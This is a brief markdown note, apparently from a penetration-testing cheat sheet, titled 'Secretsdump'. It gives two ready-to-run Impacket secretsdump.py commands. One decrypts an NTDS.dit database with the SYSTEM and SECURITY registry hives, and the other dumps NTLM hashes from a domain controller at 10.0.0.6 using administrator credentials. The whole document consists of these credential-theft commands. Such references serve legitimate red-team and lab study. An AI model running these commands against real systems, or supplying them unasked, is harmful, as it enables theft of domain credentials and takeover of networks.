---
title: "Secretsdump"
date: 2020-07-16T13:41:37+02:00
draft: false
---

#### Decrypt NTDS
```bash
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```

#### Dumping DC hashes
```bash
secretsdump.py -just-dc-ntlm offense/administrator@10.0.0.6
```

